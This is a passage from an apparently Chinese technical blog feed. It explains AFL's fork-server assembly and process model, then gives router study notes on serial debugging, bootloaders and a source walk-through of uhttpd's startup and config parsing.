class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br></pre></td><td class="code"><pre><code class="hljs assembly">&quot;__afl_forkserver:\n&quot;<br>  &quot;\n&quot;<br>  &quot;  &#x2F;* Enter the fork server mode to avoid the overhead of execve() calls. We\n&quot;<br>  &quot;     push rdx (area ptr) twice to keep stack alignment neat. *&#x2F;\n&quot;<br>  &quot;\n&quot;<br>  &quot;  pushq %rdx\n&quot;<br>  &quot;  pushq %rdx\n&quot;<br>  &quot;\n&quot;<br>  &quot;  &#x2F;* Phone home and tell the parent that we&#39;re OK. (Note that signals with\n&quot;<br>  &quot;     no SA_RESTART will mess it up). If this fails, assume that the fd is\n&quot;<br>  &quot;     closed because we were execve()d from an instrumented binary, or because\n&quot;<br>  &quot;     the parent doesn&#39;t want to use the fork server. *&#x2F;\n&quot;<br>  &quot;\n&quot;<br>  &quot;  movq $4, %rdx               &#x2F;* length    *&#x2F;\n&quot;<br>  &quot;  leaq __afl_temp(%rip), %rsi &#x2F;* data      *&#x2F;\n&quot;<br>  &quot;  movq $&quot; STRINGIFY((FORKSRV_FD + 1)) &quot;, %rdi       &#x2F;* file desc *&#x2F;\n&quot;<br>  CALL_L64(&quot;write&quot;)<br>  &quot;\n&quot;<br>  &quot;  cmpq $4, %rax\n&quot;<br>  &quot;  jne  __afl_fork_resume\n&quot;<br>  &quot;\n&quot;<br>  &quot;__afl_fork_wait_loop:\n&quot;<br>  &quot;\n&quot;<br>  &quot;  &#x2F;* Wait for parent by reading from the pipe. Abort if read fails. *&#x2F;\n&quot;<br>  &quot;\n&quot;<br>  &quot;  movq $4, %rdx               &#x2F;* length    *&#x2F;\n&quot;<br>  &quot;  leaq __afl_temp(%rip), %rsi &#x2F;* data      *&#x2F;\n&quot;<br>  &quot;  movq $&quot; STRINGIFY(FORKSRV_FD) &quot;, %rdi             &#x2F;* file desc *&#x2F;\n&quot;<br>  CALL_L64(&quot;read&quot;)<br>  &quot;  cmpq $4, %rax\n&quot;<br>  &quot;  jne  __afl_die\n&quot;<br>  &quot;\n&quot;<br>  &quot;  &#x2F;* Once woken up, create a clone of our process. This is an excellent use\n&quot;<br>  &quot;     case for syscall(__NR_clone, 0, CLONE_PARENT), but glibc boneheadedly\n&quot;<br>  &quot;     caches getpid() results and offers no way to update the value, breaking\n&quot;<br>  &quot;     abort(), raise(), and a bunch of other things :-( *&#x2F;\n&quot;<br>  &quot;\n&quot;<br>  CALL_L64(&quot;fork&quot;)<br>  &quot;  cmpq $0, %rax\n&quot;<br>  &quot;  jl   __afl_die\n&quot;<br>  &quot;  je   __afl_fork_resume\n&quot;<br>  &quot;\n&quot;<br>  &quot;  &#x2F;* In parent process: write PID to pipe, then wait for child. *&#x2F;\n&quot;<br>  &quot;\n&quot;<br>  &quot;  movl %eax, __afl_fork_pid(%rip)\n&quot;<br>  &quot;\n&quot;<br>  &quot;  movq $4, %rdx                   &#x2F;* length    *&#x2F;\n&quot;<br>  &quot;  leaq __afl_fork_pid(%rip), %rsi &#x2F;* data      *&#x2F;\n&quot;<br>  &quot;  movq $&quot; STRINGIFY((FORKSRV_FD + 1)) &quot;, %rdi             &#x2F;* file desc *&#x2F;\n&quot;<br>  CALL_L64(&quot;write&quot;)<br>  &quot;\n&quot;<br>  &quot;  movq $0, %rdx                   &#x2F;* no flags  *&#x2F;\n&quot;<br>  &quot;  leaq __afl_temp(%rip), %rsi     &#x2F;* status    *&#x2F;\n&quot;<br>  &quot;  movq __afl_fork_pid(%rip), %rdi &#x2F;* PID       *&#x2F;\n&quot;<br>  CALL_L64(&quot;waitpid&quot;)<br>  &quot;  cmpq $0, %rax\n&quot;<br>  &quot;  jle  __afl_die\n&quot;<br>  &quot;\n&quot;<br>  &quot;  &#x2F;* Relay wait status to pipe, then loop back. *&#x2F;\n&quot;<br>  &quot;\n&quot;<br>  &quot;  movq $4, %rdx               &#x2F;* length    *&#x2F;\n&quot;<br>  &quot;  leaq __afl_temp(%rip), %rsi &#x2F;* data      *&#x2F;\n&quot;<br>  &quot;  movq $&quot; STRINGIFY((FORKSRV_FD + 1)) &quot;, %rdi         &#x2F;* file desc *&#x2F;\n&quot;<br>  CALL_L64(&quot;write&quot;)<br>  &quot;\n&quot;<br>  &quot;  jmp  __afl_fork_wait_loop\n&quot;<br>  &quot;\n&quot;<br>  &quot;__afl_fork_resume:\n&quot;<br>  &quot;\n&quot;<br>  &quot;  &#x2F;* In child process: close fds, resume execution. *&#x2F;\n&quot;<br>  &quot;\n&quot;<br>  &quot;  movq $&quot; STRINGIFY(FORKSRV_FD) &quot;, %rdi\n&quot;<br>  CALL_L64(&quot;close&quot;)<br>  &quot;\n&quot;<br>  &quot;  movq $&quot; STRINGIFY((FORKSRV_FD + 1)) &quot;, %rdi\n&quot;<br>  CALL_L64(&quot;close&quot;)<br>  &quot;\n&quot;<br>  &quot;  popq %rdx\n&quot;<br>  &quot;  popq %rdx\n&quot;<br>  &quot;\n&quot;<br>  &quot;  movq %r12, %rsp\n&quot;<br>  &quot;  popq %r12\n&quot;<br>  &quot;\n&quot;<br>  &quot;  movq  0(%rsp), %rax\n&quot;<br>  &quot;  movq  8(%rsp), %rcx\n&quot;<br>  &quot;  movq 16(%rsp), %rdi\n&quot;<br>  &quot;  movq 32(%rsp), %rsi\n&quot;<br>  &quot;  movq 40(%rsp), %r8\n&quot;<br>  &quot;  movq 48(%rsp), %r9\n&quot;<br>  &quot;  movq 56(%rsp), %r10\n&quot;<br>  &quot;  movq 64(%rsp), %r11\n&quot;<br>  &quot;\n&quot;<br>  &quot;  movq  96(%rsp), %xmm0\n&quot;<br>  &quot;  movq 112(%rsp), %xmm1\n&quot;<br>  &quot;  movq 128(%rsp), %xmm2\n&quot;<br>  &quot;  movq 144(%rsp), %xmm3\n&quot;<br>  &quot;  movq 160(%rsp), %xmm4\n&quot;<br>  &quot;  movq 176(%rsp), %xmm5\n&quot;<br>  &quot;  movq 192(%rsp), %xmm6\n&quot;<br>  &quot;  movq 208(%rsp), %xmm7\n&quot;<br>  &quot;  movq 224(%rsp), %xmm8\n&quot;<br>  &quot;  movq 240(%rsp), %xmm9\n&quot;<br>  &quot;  movq 256(%rsp), %xmm10\n&quot;<br>  &quot;  movq 272(%rsp), %xmm11\n&quot;<br>  &quot;  movq 288(%rsp), %xmm12\n&quot;<br>  &quot;  movq 304(%rsp), %xmm13\n&quot;<br>  &quot;  movq 320(%rsp), %xmm14\n&quot;<br>  &quot;  movq 336(%rsp), %xmm15\n&quot;<br>  &quot;\n&quot;<br>  &quot;  leaq 352(%rsp), %rsp\n&quot;<br>  &quot;\n&quot;<br>  &quot;  jmp  __afl_store\n&quot;<br>  &quot;\n&quot;<br>  &quot;__afl_die:\n&quot;<br>  &quot;\n&quot;<br>  &quot;  xorq %rax, %rax\n&quot;<br>  CALL_L64(&quot;_exit&quot;)<br>  &quot;\n&quot;<br></code></pre></td></tr></table></figure><p>首先压栈两次保证16字节对齐，接着向指定的管道<code>FORKSRV_FD + 1</code>写入四字节magicnumber表示子进程已准备就绪,接着比较返回值是否为4判断是否写入成功，失败则进入<code>afl_fork_resume</code>函数，否则进入<code>afl_fork_wait_loop</code>，通过调用read函数来从管道接收消息判断父进程是否返回响应，如果读取失败或者读取字节不足4则进入<code>afl_die</code>函数。如果成功响应则开始fork。如果fork失败则会进入afl_die,如果为0则代表为子进程进入fork_resume,成功的话会保存子进程pid并写入给父进程，接着调用watpid等待子进程结束。关于afl_resume可以看到是关闭了两个管道并恢复了现场环境然后进入覆盖率统计函数，afl_die则是直接exit。</p><p>至此可以大致看到整体的afl框架</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs perl">父进程(fuzzer)<br>负责管理整个afl fuzzer的初始进程，主要负责生成和修改输入的数据并监控子进程(<span class="hljs-keyword">fork</span> server)的状态。他不会执行测试用例而是通过和<span class="hljs-keyword">fork</span> server进行通信，让<span class="hljs-keyword">fork</span> server来启动新的测试用例<br><br>子进程(<span class="hljs-keyword">fork</span> server)<br>即mainpayload代码。主要功能是负责和父进程通信接收信号，每接收到一次信号就通过<span class="hljs-keyword">fork</span>创建一个新的测试用例然后通过<span class="hljs-keyword">waitpid</span>等待测试用例执行并判断其状态，收集结果后继续等待来自父进程的下一个信号。这种设计避免了反复调用execve从而提升了效率<br><br>子子进程(测试用例)<br>由<span class="hljs-keyword">fork</span> server创建的进程，每个进程都独立执行一次，完成测试后将执行结果返回给<span class="hljs-keyword">fork</span> server然后退出。<br></code></pre></td></tr></table></figure><p>这也可以看出来afl比libfuzzer的一个优势，测试用例程序的崩溃并不会影响父进程，都是隔离的，而libfuzzer一旦崩溃就直接退出。</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>router学习笔记</title>
    <link href="/2024/01/22/router%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    <url>/2024/01/22/router%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
    
    <content type="html"><![CDATA[<p>router相关的一些基础知识学习与理解。uhttpd源码分析+openwrt启动流程学习</p><a id="more"></a><h1 id="router"><a href="#router" class="headerlink" title="router"></a>router</h1><p>基础知识学习与理解</p><h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><p>串口调试工具 hyperterminal，需要配合杜邦线和usb转ttl转接板。注意如果提前连接好杜邦线再插入usb口可能会获取不到信息，这时要先插入usb口然后开启路由器等待一段时间后将杜邦线插入到ttl转usb转接板上，接法是GND-GND、RXD-TXD、TXD-RXD。</p><h2 id="Bootloader"><a href="#Bootloader" class="headerlink" title="Bootloader"></a>Bootloader</h2><p>Bootloader 是系统上电或复位后最先执行的程序。它的任务是初始化硬件并加载操作系统内核到 RAM 中并运行它。如RAM初始化、内核镜像调用、内核解密、文件系统解密等。</p><p>常见的 bootloader 有：</p><p><code>GRUB</code>:GNU GRand Unified Bootloader 是 Linux、UNIX 和其他操作系统的常见 bootloader。它提供了一个菜单，允许用户选择不同的操作系统或内核版本。</p><p><code>LILO</code>:Linux Loader，是早期的 Linux bootloader，现已被 GRUB 替代。</p><p><code>U-Boot</code>:通用 bootloader，主要用于嵌入式设备。</p><p><code>Fastboot</code>:Android 设备上的 bootloader。</p><p><code>RedBoot:</code>另一种嵌入式设备 bootloader。</p><p><code>Syslinux/Isolinux:</code>用于启动 live CD 或其他轻量级媒体的 bootloader。</p><p><code>EFI/UEFI</code>:现代计算机上的 bootloader 接口，用于替代传统的 BIOS。</p><p>通常，bootloader 存储在设备的只读内存 (ROM) 或其他不可修改的存储中，以确保它在设备启动时始终可用。但也有一些 bootloader 是可以更新的，这样能够为设备提供新功能或修复错误。</p><h2 id="uhttpd源码分析"><a href="#uhttpd源码分析" class="headerlink" title="uhttpd源码分析"></a>uhttpd源码分析</h2><p>先从main函数开始，如下</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span> **argv)</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">alias</span> *<span class="hljs-title">alias</span>;</span><br><span class="hljs-keyword">bool</span> nofork = <span class="hljs-literal">false</span>;<br><span class="hljs-keyword">char</span> *port;<br><span class="hljs-keyword">int</span> opt, ch;<br><span class="hljs-keyword">int</span> cur_fd;<br><span class="hljs-keyword">int</span> bound = <span class="hljs-number">0</span>;<br><span class="hljs-meta">#<span class="hljs-meta-keyword">ifdef</span> HAVE_TLS</span><br><span class="hljs-keyword">int</span> n_tls = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *tls_key = <span class="hljs-literal">NULL</span>, *tls_crt = <span class="hljs-literal">NULL</span>, *tls_ciphers = <span class="hljs-literal">NULL</span>;<br><span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">ifdef</span> HAVE_LUA</span><br><span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *lua_prefix = <span class="hljs-literal">NULL</span>, *lua_handler = <span class="hljs-literal">NULL</span>;<br><span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">ifdef</span> HAVE_UCODE</span><br><span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *ucode_prefix = <span class="hljs-literal">NULL</span>, *ucode_handler = <span class="hljs-literal">NULL</span>;<br><span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span></span><br></code></pre></td></tr></table></figure><p>根据条件初始化一些变量</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c++">BUILD_BUG_ON(<span class="hljs-keyword">sizeof</span>(uh_buf) &lt; PATH_MAX);<span class="hljs-comment">//检查缓冲区大小</span><br><br>uh_dispatch_add(&amp;cgi_dispatch);<br>init_defaults_pre();<br>signal(SIGPIPE, SIG_IGN);<br></code></pre></td></tr></table></figure><p>uh_dispatch_add函数负责吧cgi添加到链表中</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-keyword">struct</span> dispatch_handler cgi_dispatch = &#123;<br>.script = <span class="hljs-literal">true</span>,<br>.check_path = check_cgi_path,<br>.handle_request = cgi_handle_request,<br>&#125;;<br>void uh<span class="hljs-constructor">_dispatch_add(<span class="hljs-params">struct</span> <span class="hljs-params">dispatch_handler</span> <span class="hljs-operator">*</span><span class="hljs-params">d</span>)</span><br>&#123;<br><span class="hljs-built_in">list</span><span class="hljs-constructor">_add_tail(&amp;<span class="hljs-params">d</span>-&gt;<span class="hljs-params">list</span>, &amp;<span class="hljs-params">dispatch_handlers</span>)</span>;<br>&#125;<br></code></pre></td></tr></table></figure><ul><li><code>.script = true</code>：这可能意味着该处理器是用来处理脚本请求的。</li><li><code>.check_path = check_cgi_path</code>：一个函数指针，可能用于检查请求路径是否为有效的CGI路径。</li><li><code>.handle_request = cgi_handle_request</code>：一个函数指针，用于处理CGI请求。</li></ul><p>init_defaults_pre函数负责初始化配置的默认值</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">static void init<span class="hljs-constructor">_defaults_pre(<span class="hljs-params">void</span>)</span><br>&#123;<br>conf.script_timeout = <span class="hljs-number">60</span>;<br>conf.network_timeout = <span class="hljs-number">30</span>;<br>conf.http_keepalive = <span class="hljs-number">20</span>;<br>conf.max_script_requests = <span class="hljs-number">3</span>;<br>conf.max_connections = <span class="hljs-number">100</span>;<br>conf.realm = <span class="hljs-string">&quot;Protected Area&quot;</span>;<br>conf.cgi_prefix = <span class="hljs-string">&quot;/cgi-bin&quot;</span>;<br>conf.cgi_path = <span class="hljs-string">&quot;/sbin:/usr/sbin:/bin:/usr/bin&quot;</span>;<br><span class="hljs-constructor">INIT_LIST_HEAD(&amp;<span class="hljs-params">conf</span>.<span class="hljs-params">cgi_alias</span>)</span>;<br><span class="hljs-constructor">INIT_LIST_HEAD(&amp;<span class="hljs-params">conf</span>.<span class="hljs-params">lua_prefix</span>)</span>;<br>#<span class="hljs-keyword">if</span> HAVE_UCODE<br><span class="hljs-constructor">INIT_LIST_HEAD(&amp;<span class="hljs-params">conf</span>.<span class="hljs-params">ucode_prefix</span>)</span>;<br>#endif<br>&#125;<br></code></pre></td></tr></table></figure><p>signal(SIGPIPE, SIG_IGN);用来忽略信号，防止客户端突然断开导致uhttpd进程退出</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs arcade"><span class="hljs-string">`signal(SIGPIPE, SIG_IGN);`</span> 是一个常见的编程技巧，用于忽略 <span class="hljs-string">`SIGPIPE`</span> 信号。在网络编程中，当试图写入一个已经关闭的套接字或管道时，进程会收到一个 <span class="hljs-string">`SIGPIPE`</span> 信号。默认情况下，这个信号会导致进程终止。<br><br>在服务器应用程序中，客户端突然断开连接是一个常见的情况。如果没有处理 <span class="hljs-string">`SIGPIPE`</span> 信号，那么每当这种情况发生时，服务器进程都可能会意外终止，这显然是不可接受的。<br><br>通过使用 <span class="hljs-string">`signal(SIGPIPE, SIG_IGN);`</span>，进程告诉操作系统它希望忽略 <span class="hljs-string">`SIGPIPE`</span> 信号。这意味着即使尝试写入已关闭的套接字，进程也不会因为收到 <span class="hljs-string">`SIGPIPE`</span> 信号而终止。相反，写入操作会返回一个错误，通常是 <span class="hljs-string">`EPIPE`</span>，这样程序可以适当地处理这种情况，而不是意外终止。<br></code></pre></td></tr></table></figure><p>在后面就是一个很大的switch case负责解析命令行参数</p><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lisp">while ((<span class="hljs-name">ch</span> = getopt(<span class="hljs-name">argc</span>, argv, <span class="hljs-string">&quot;A:ab:C:c:Dd:E:e:fh:H:I:i:K:k:L:l:m:N:n:O:o:P:p:qRr:Ss:T:t:U:u:Xx:y:&quot;</span>)) != <span class="hljs-number">-1</span>)<br></code></pre></td></tr></table></figure><p>具体对每个参数的解释和编译配置相关，假如某些配置没有编译那么就会报错，如TLS的选项没有的话就会打印如下错误信息</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;uhttpd: TLS support not compiled, &quot;</span><br>                <span class="hljs-string">&quot;ignoring -%c\n&quot;</span>, ch);<br></code></pre></td></tr></table></figure><p>参数的解释与使用可以看源码的usage函数。</p><p>switch case完后会执行如下函数</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">uh_config_parse</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *path = conf.file;<br>FILE *c;<br><span class="hljs-keyword">char</span> line[<span class="hljs-number">512</span>];<br><span class="hljs-keyword">char</span> *col1;<br><span class="hljs-keyword">char</span> *col2;<br><span class="hljs-keyword">char</span> *eol;<br><br><span class="hljs-keyword">if</span> (!path)<br>path = <span class="hljs-string">&quot;/etc/httpd.conf&quot;</span>;<br><br>c = fopen(path, <span class="hljs-string">&quot;r&quot;</span>);<br><span class="hljs-keyword">if</span> (!c)<br><span class="hljs-keyword">return</span>;<br><br><span class="hljs-built_in">memset</span>(line, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(line));<br><br><span class="hljs-keyword">while</span> (fgets(line, <span class="hljs-keyword">sizeof</span>(line) - <span class="hljs-number">1</span>, c)) &#123;<br><span class="hljs-keyword">if</span> ((line[<span class="hljs-number">0</span>] == <span class="hljs-string">&#x27;/&#x27;</span>) &amp;&amp; (<span class="hljs-built_in">strchr</span>(line, <span class="hljs-string">&#x27;:&#x27;</span>) != <span class="hljs-literal">NULL</span>)) &#123;<br><span class="hljs-keyword">if</span> (!(col1 = <span class="hljs-built_in">strchr</span>(line, <span class="hljs-string">&#x27;:&#x27;</span>)) || (*col1++ = <span class="hljs-number">0</span>) ||<br>!(col2 = <span class="hljs-built_in">strchr</span>(col1, <span class="hljs-string">&#x27;:&#x27;</span>)) || (*col2++ = <span class="hljs-number">0</span>) ||<br>!(eol = <span class="hljs-built_in">strchr</span>(col2, <span class="hljs-string">&#x27;\n&#x27;</span>)) || (*eol++  = <span class="hljs-number">0</span>))<br><span class="hljs-keyword">continue</span>;<br><br>uh_auth_add(line, col1, col2);<br>&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">strncmp</span>(line, <span class="hljs-string">&quot;I:&quot;</span>, <span class="hljs-number">2</span>)) &#123;<br><span class="hljs-keyword">if</span> (!(col1 = <span class="hljs-built_in">strchr</span>(line, <span class="hljs-string">&#x27;:&#x27;</span>)) || (*col1++ = <span class="hljs-number">0</span>) ||<br>!(eol = <span class="hljs-built_in">strchr</span>(col1, <span class="hljs-string">&#x27;\n&#x27;</span>)) || (*eol++  = <span class="hljs-number">0</span>))<br><span class="hljs-keyword">continue</span>;<br><br>uh_index_add(strdup(col1));<br>&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">strncmp</span>(line, <span class="hljs-string">&quot;E404:&quot;</span>, <span class="hljs-number">5</span>)) &#123;<br><span class="hljs-keyword">if</span> (!(col1 = <span class="hljs-built_in">strchr</span>(line, <span class="hljs-string">&#x27;:&#x27;</span>)) || (*col1++ = <span class="hljs-number">0</span>) ||<br>!(eol = <span class="hljs-built_in">strchr</span>(col1, <span class="hljs-string">&#x27;\n&#x27;</span>)) || (*eol++  = <span class="hljs-number">0</span>))<br><span class="hljs-keyword">continue</span>;<br><br>conf.error_handler = strdup(col1);<br>&#125;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> ((line[<span class="hljs-number">0</span>] == <span class="hljs-string">&#x27;*&#x27;</span>) &amp;&amp; (<span class="hljs-built_in">strchr</span>(line, <span class="hljs-string">&#x27;:&#x27;</span>) != <span class="hljs-literal">NULL</span>)) &#123;<br><span class="hljs-keyword">if</span> (!(col1 = <span class="hljs-built_in">strchr</span>(line, <span class="hljs-string">&#x27;*&#x27;</span>)) || (*col1++ = <span class="hljs-number">0</span>) ||<br>!(col2 = <span class="hljs-built_in">strchr</span>(col1, <span class="hljs-string">&#x27;:&#x27;</span>)) || (*col2++ = <span class="hljs-number">0</span>) ||<br>!(eol = <span class="hljs-built_in">strchr</span>(col2, <span class="hljs-string">&#x27;\n&#x27;</span>)) || (*eol++  = <span class="hljs-number">0</span>))<br><span class="hljs-keyword">continue</span>;<br><br>uh_interpreter_add(col1, col2);<br>&#125;<br>&#125;<br><br>fclose(c);<br>&#125;<br></code></pre></td></tr></table></figure><p>参数-c可以指定config文件，如果没有指定的话就会使用默认的<code>/etc/httpd.conf</code></p><p>然后就是解析config文件分为四种</p><ol><li><strong>以 <code>/</code> 开头，且包含 <code>:</code> 的行</strong>：<br>这种类型的行被认为是定义了HTTP Basic Auth的行。每一行的格式应为<code>/path:username:password</code>，其中<code>/path</code>是需要保护的路径，<code>username</code>是用户名，<code>password</code>是密码。这些信息会被提取出来，并通过调用<code>uh_auth_add(line, col1, col2)</code>函数添加到验证信息列表中。</li><li><strong>以 <code>I:</code> 开头的行</strong>：<br>这种类型的行用来定义默认的索引文件。索引文件的名称紧随<code>I:</code>之后。该名称会被提取出来，通过<code>uh_index_add(strdup(col1))</code>函数添加到索引文件列表中。</li><li><strong>以 <code>E404:</code> 开头的行</strong>：<br>这种类型的行用来定义HTTP 404错误的处理程序。错误处理程序的路径紧随<code>E404:</code>之后。该路径会被提取出来，保存到<code>conf.error_handler</code>变量中。</li><li><strong>以 <code>\*</code> 开头，且包含 <code>:</code> 的行</strong>：<br>这种类型的行用来定义解释器。每一行的格式应为<code>*.ext:/path/to/interpreter</code>，其中<code>*.ext</code>是需要被解释的文件扩展名，<code>/path/to/interpreter</code>是用来解释这类文件的解释器的路径。这些信息会被提取出来，并通过调用<code>uh_interpreter_add(col1, col2)</code>函数添加到解释器列表中。</li></ol><p>接着依旧是根据编译选项的几个分支处理</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">ifdef</span> HAVE_TLS</span><br><span class="hljs-keyword">if</span> (n_tls) &#123;<br><span class="hljs-keyword">if</span> (!tls_crt || !tls_key) &#123;<br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;Please specify a certificate and &quot;</span><br><span class="hljs-string">&quot;a key file to enable SSL support\n&quot;</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>&#125;<br><br><span class="hljs-keyword">if</span> (uh_tls_init(tls_key, tls_crt, tls_ciphers))<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>&#125;<br><span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span></span><br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">ifdef</span> HAVE_LUA</span><br><span class="hljs-keyword">if</span> (lua_handler || lua_prefix) &#123;<br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;Need handler and prefix to enable Lua support\n&quot;</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>&#125;<br><br><span class="hljs-keyword">if</span> (!list_empty(&amp;conf.lua_prefix) &amp;&amp; uh_plugin_init(<span class="hljs-string">&quot;uhttpd_lua.so&quot;</span>))<br><span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br><span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">ifdef</span> HAVE_UCODE</span><br><span class="hljs-keyword">if</span> (ucode_handler || ucode_prefix) &#123;<br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;Need handler and prefix to enable ucode support\n&quot;</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>&#125;<br><br><span class="hljs-keyword">if</span> (!list_empty(&amp;conf.ucode_prefix) &amp;&amp; uh_plugin_init(<span class="hljs-string">&quot;uhttpd_ucode.so&quot;</span>))<br><span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br><span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">ifdef</span> HAVE_UBUS</span><br><span class="hljs-keyword">if</span> (conf.ubus_prefix &amp;&amp; uh_plugin_init(<span class="hljs-string">&quot;uhttpd_ubus.so&quot;</span>))<br><span 